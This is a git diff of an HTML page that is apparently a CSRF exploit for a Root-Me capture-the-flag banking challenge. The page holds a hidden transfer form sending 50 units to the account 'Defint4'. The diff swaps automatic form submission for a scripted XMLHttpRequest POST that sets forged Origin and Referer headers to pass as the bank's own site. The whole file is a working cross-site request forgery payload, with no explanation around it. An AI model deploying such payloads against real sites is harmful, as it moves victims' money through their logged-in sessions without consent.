@@ -5,13 +5,16 @@
 </head>
 <body>
     <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
-        <!-- Paramètres automatiques -->
         <input type="hidden" name="recipient" value="Defint4">
         <input type="hidden" name="amount" value="50">
     </form>
     <script>
-        // Soumettre automatiquement dès que la page est chargée
-        document.getElementById('csrf-form').submit();
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "/transfer/", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Origin", "https://bankme-1.challenges.pro.root-me.org");
+        xhr.setRequestHeader("Referer", "https://bankme-1.challenges.pro.root-me.org/profile/?message=0");
+        xhr.send("recipient=Defint4&amount=50");
     </script>
 </body>
 </html>
